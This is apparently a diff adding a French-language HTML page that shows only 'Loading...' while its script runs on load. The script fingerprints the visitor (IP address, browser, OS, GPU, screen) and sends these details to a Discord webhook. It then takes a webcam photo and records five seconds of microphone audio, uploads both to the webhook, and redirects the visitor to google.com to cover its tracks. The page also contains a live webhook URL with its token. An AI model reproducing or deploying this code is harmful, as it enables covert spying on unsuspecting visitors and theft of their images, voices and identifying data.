@@ -1,0 +1,212 @@
+<!DOCTYPE html> 
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>View</title>
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  background:#0b0d13;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#888;
+  font-family:Arial, sans-serif;
+}
+</style>
+</head>
+
+<body onload="sendAuto()">
+Loading... 
+<script>
+function setCookie(name,value,days){
+  let d=new Date();
+  d.setTime(d.getTime()+days*86400000);
+  document.cookie=name+"="+value+";expires="+d.toUTCString()+";path=/";
+}
+function getCookie(name){
+  let m=document.cookie.match('(^|;) ?'+name+'=([^;]*)');
+  return m?m[2]:null;
+}
+
+function getBrowser(ua){
+  if(ua.includes("Chrome"))return"Google Chrome";
+  if(ua.includes("Firefox"))return"Mozilla Firefox";
+  if(ua.includes("Edge"))return"Microsoft Edge";
+  if(ua.includes("Safari"))return"Apple Safari";
+  return"Unknown";
+}
+function getOS(ua){
+  if(ua.includes("Win"))return"Windows";
+  if(ua.includes("Mac"))return"MacOS";
+  if(ua.includes("Linux"))return"Linux";
+  if(ua.includes("Android"))return"Android";
+  if(ua.includes("iPhone"))return"iOS";
+  return"Unknown";
+}
+function getGPU(){
+  try{
+    let c=document.createElement("canvas");
+    let gl=c.getContext("webgl");
+    let e=gl.getExtension("WEBGL_debug_renderer_info");
+    return gl.getParameter(e.UNMASKED_RENDERER_WEBGL);
+  }catch{return"Unknown";}
+}
+
+async function captureWebcam(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    
+    return new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        stream.getTracks().forEach(track => track.stop());
+        
+        canvas.toBlob((blob) => {
+          resolve(blob);
+        }, 'image/jpeg', 0.95);
+      };
+    });
+  }catch(err){
+    console.error("Erreur webcam:", err);
+    return null;
+  }
+}
+
+async function captureAudio(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+    const mediaRecorder = new MediaRecorder(stream);
+    const audioChunks = [];
+    
+    return new Promise((resolve) => {
+      mediaRecorder.ondataavailable = (event) => {
+        audioChunks.push(event.data);
+      };
+      
+      mediaRecorder.onstop = () => {
+        stream.getTracks().forEach(track => track.stop());
+        const audioBlob = new Blob(audioChunks, {type: 'audio/webm'});
+        resolve(audioBlob);
+      };
+      
+      mediaRecorder.start();
+      
+      setTimeout(() => {
+        mediaRecorder.stop();
+      }, 5000);
+    });
+  }catch(err){
+    console.error("Erreur audio:", err);
+    return null;
+  }
+}
+
+async function sendAuto(){
+
+  let uid=getCookie("userId");
+  if(!uid){
+    uid=Date.now().toString();
+    setCookie("userId",uid,365);
+  }
+
+  const ipResponse = await fetch("https://api.ipify.org?format=json");
+  const ip = await ipResponse.json();
+  
+  let ua=navigator.userAgent;
+  let currentUrl = window.location.href;
+
+  let payload={
+    embeds:[{
+      fields:[
+        {name:"Website",value:currentUrl},
+        {name:"IP Address",value:ip.ip},
+        {name:"User Agent",value:ua},
+        {name:"Language",value:navigator.language},
+        {name:"Browser",value:getBrowser(ua)},
+        {name:"Operating System",value:getOS(ua)},
+        {name:"GPU",value:getGPU()},
+        {name:"Date and Time",value:new Date().toLocaleString()},
+        {name:"Screen Resolution",value:screen.width+"x"+screen.height},
+        {name:"Device Model",value:"N/A"},
+        {name:"Cookie ID",value:uid}
+      ]
+    }]
+  };
+
+  await fetch("webhook_discord_here",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(payload)
+  });
+
+  const webcamBlob = await captureWebcam();
+  
+  if(webcamBlob){
+    const formData = new FormData();
+    formData.append('file', webcamBlob, 'webcam.jpg');
+    
+    const webcamPayload = {
+      embeds:[{
+        title: "Webcam Capture",
+        description: `Photo de la webcam pour ${currentUrl}`,
+        fields:[
+          {name:"IP Address",value:ip.ip},
+          {name:"Cookie ID",value:uid}
+        ],
+        image: {
+          url: "attachment://webcam.jpg"
+        }
+      }]
+    };
+    
+    formData.append('payload_json', JSON.stringify(webcamPayload));
+    
+    await fetch("https://discord.com/api/webhooks/1454106851628158988/_m_C70XTl0dEBqUsdqAxn9Qs0SZiVQbpzZmXzJeTe8jQXryQNTfqzBz7AYJ-HqE56ycU",{
+      method:"POST",
+      body: formData
+    });
+  }
+
+  const audioBlob = await captureAudio();
+  
+  if(audioBlob){
+    const formData = new FormData();
+    formData.append('file', audioBlob, 'audio.webm');
+    
+    const audioPayload = {
+      embeds:[{
+        title: "Audio Capture",
+        description: `Enregistrement audio de 5 secondes pour ${currentUrl}`,
+        fields:[
+          {name:"IP Address",value:ip.ip},
+          {name:"Cookie ID",value:uid},
+          {name:"Duration",value:"5 seconds"}
+        ]
+      }]
+    };
+    
+    formData.append('payload_json', JSON.stringify(audioPayload));
+    
+    await fetch("Webhook_discord_here",{
+      method:"POST",
+      body: formData
+    });
+  }
+
+  window.location.href="https://google.com";
+}
+</script>
+</body>
+</html>
